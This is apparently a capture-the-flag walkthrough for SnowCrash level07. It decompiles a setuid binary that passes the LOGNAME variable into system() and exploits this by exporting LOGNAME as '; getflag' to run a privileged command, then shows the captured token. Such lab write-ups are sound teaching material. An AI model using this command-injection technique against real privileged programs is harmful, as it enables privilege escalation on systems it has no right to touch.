we notice two files in the home directory
```shell
level07@SnowCrash:~$ ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

using binary ninja we to inspect the source code of the `level07` binary, we fined the following snippet

```C
int32_t main(int argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    char* var_1c = nullptr;
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    return system(var_1c);
}
```

looks like the binary file get's the value of `LOGNAME` env variable and then prints it using the `system` command

we can inject malicious  value using the following command

```shell
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

that was easy. on to the next level
